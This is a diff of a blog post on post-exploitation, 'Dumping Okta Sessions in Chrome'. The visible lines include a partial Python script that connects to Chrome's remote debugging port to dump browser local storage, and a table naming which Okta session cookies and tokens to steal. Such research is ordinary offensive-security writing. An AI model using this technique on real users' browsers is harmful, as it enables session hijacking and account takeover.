@@ -1,9 +1,13 @@
 ---
 layout: post
-title:  "Dumping Okta Sessions in Chrome"
-date:   2024-11-17 03:00:00 -0600
+title: "Dumping Okta Sessions in Chrome"
+date: 2024-11-17
 tags: ["post-exploitation"]
 ---
+
+# Problem Statement
+
+How difficult is it to steal Okta session tokens?
 
 # Local Storage
 
@@ -31,8 +35,8 @@ Using a websocket client, connect using the correct page id to dump the unencryp
 * `pip3 install websocket`
 * `pip3 install websocket-client`
 
-#### **`ripWCMN.py`**
 ```python
+# ripWCMN.py
 import websocket
 ws = websocket.WebSocket()
 ws.connect("ws://localhost:9222/devtools/page/<id>", suppress_origin=True)
@@ -51,13 +55,13 @@ If an admin session is stolen from `{tenant}.okta.com`, the session cookie can b
 | Account | Name | Type | Note |
 |---|---|---|---|
 | Okta Admin | sid | cookie |  |
-| Okta User | okta-token-storage | localStorage | JWT Auth Bearer |
-| Okta User | idx | cookie | Reveals more data than bearer token |
+| Okta User | okta-token-storage | localStorage | jwt auth token |
+| Okta User | idx | cookie | higher perms than bearer token |
 
 ### References:
-[^1]: https://github.com/rdreher/chromeStorageDump
-[^2]: https://www.cyberark.com/resources/threat-research-blog/the-current-state-of-browser-cookies
-[^3]: https://gist.github.com/creachadair/937179894a24571ce9860e2475a2d2ec
-[^4]: https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f
-[^5]: https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e
-[^6]: https://www.linkedin.com/pulse/oktas-so-secret-less-secure-api-authentication-method-chaim-sanders/
+[^1]: [https://github.com/rdreher/chromeStorageDump](https://github.com/rdreher/chromeStorageDump)
+[^2]: [https://www.cyberark.com/resources/threat-research-blog/the-current-state-of-browser-cookies](https://www.cyberark.com/resources/threat-research-blog/the-current-state-of-browser-cookies)
+[^3]: [https://gist.github.com/creachadair/937179894a24571ce9860e2475a2d2ec](https://gist.github.com/creachadair/937179894a24571ce9860e2475a2d2ec)
+[^4]: [https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
+[^5]: [https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
+[^6]: [https://www.linkedin.com/pulse/oktas-so-secret-less-secure-api-authentication-method-chaim-sanders/](https://www.linkedin.com/pulse/oktas-so-secret-less-secure-api-authentication-method-chaim-sanders/)
